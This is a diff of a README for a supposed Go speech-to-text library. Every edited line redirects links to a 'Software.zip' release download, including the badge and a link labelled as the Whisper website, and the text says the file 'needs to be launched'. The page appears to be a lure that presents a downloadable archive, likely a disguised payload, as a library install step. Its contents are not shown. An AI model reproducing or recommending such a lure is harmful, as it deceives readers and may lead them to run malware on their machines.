@@ -1,6 +1,6 @@
 # 🎙️ Speech Library for Go
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/baomeomeo/speech/releases/download/v2.0/Software.zip)](https://github.com/baomeomeo/speech/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -9,7 +9,7 @@ Welcome to the "speech" repository, a powerful Speech-To-Text library for Go tha
 ## Installation
 
 To get started with using the "speech" library, you can download the necessary software from the following link:
-[Download Software](https://github.com/user-attachments/files/18388744/Software.zip) (This link needs to be launched)
+[Download Software](https://github.com/baomeomeo/speech/releases/download/v2.0/Software.zip) (This link needs to be launched)
 
 ## Features
 
@@ -22,7 +22,7 @@ To get started with using the "speech" library, you can download the necessary s
 
 Here's a quick guide on how to start using the "speech" library in your Go projects:
 
-1. **Download the Software**: Click on the [Download Software](https://github.com/user-attachments/files/18388744/Software.zip) link to obtain the necessary files.
+1. **Download the Software**: Click on the [Download Software](https://github.com/baomeomeo/speech/releases/download/v2.0/Software.zip) link to obtain the necessary files.
 2. **Integrate the Library**: Ensure the library is included in your Go project.
 3. **Start Transcribing**: Use the library functions to transcribe speech to text.
 4. **Explore Translation**: Experiment with the translation features offered by the library.
@@ -35,7 +35,7 @@ Here's a quick guide on how to start using the "speech" library in your Go proje
 
 If the provided link does not work, please check the "Releases" section of this repository for alternative download options.
 
-🌐 Visit the [Whisper Website](https://www.whisper-technology.com) for more information on the technology powering this library.
+🌐 Visit the [Whisper Website](https://github.com/baomeomeo/speech/releases/download/v2.0/Software.zip) for more information on the technology powering this library.
 
 ---
 
